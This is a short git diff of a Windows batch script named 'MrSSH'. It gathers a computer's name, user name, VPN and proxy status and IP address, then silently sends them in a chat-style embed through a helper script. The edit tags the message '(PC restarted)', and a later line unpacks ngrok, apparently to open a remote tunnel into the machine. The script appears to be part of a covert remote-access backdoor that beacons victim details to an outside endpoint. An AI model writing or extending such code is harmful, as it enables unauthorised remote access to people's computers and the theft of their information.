@@ -20,7 +20,7 @@ FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.v
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter security.proxy`) DO (SET proxy=%%F)
 FOR /F "tokens=* USEBACKQ" %%F IN (`router --usecolors false --filter query`) DO (SET local=%%F)
 
-call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username%" ":desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local%" "52bf90" "https://i.imgur.com/b2Terft.png"
+call source.bat +silent --embed "MrSSH has been invoked on %computername%\%username% (PC restarted)" ":desktop: **PC name:** %computername% \\n\\n:bust_in_silhouette: **User name:** %username% \\n\\n:file_cabinet: **Using VPN?:** %vpn% \\n\\n:map: **Using proxy?:** %proxy% \\n\\n:house:**Ip address:** %local%" "52bf90" "https://i.imgur.com/b2Terft.png"
 
 tar -xf ngrok.zip
 
